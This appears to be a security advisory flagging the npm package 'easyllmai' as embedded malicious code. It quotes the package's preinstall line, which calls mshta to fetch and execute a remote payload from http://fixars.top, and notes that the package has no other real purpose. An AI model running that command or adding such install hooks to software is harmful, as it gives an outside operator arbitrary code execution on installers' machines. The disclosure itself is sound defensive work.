summary: easyllmai preinstall executes remote payload via mshta from attacker-controlled host
details: On `npm install`, the package's preinstall lifecycle script (preinstall.js line 3) runs `exec('cmd /c "mshta http://fixars.top"')`. On Windows installers, mshta fetches and executes the HTA/JS payload served at http://fixars.top, granting the operator of that host arbitrary code execution on the installer's machine. The fetch is over plain HTTP, the URL is not pinned or integrity-checked, and the payload is opaque and mutable. The package's only library content is a trivial `greet(name)` function in index.js, with empty `description`, `author`, and `keywords` in package.json — the package has no legitimate purpose beyond delivering the dropper. The name `easyllmai` appears designed to attract installs through confusion with real LLM tooling.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
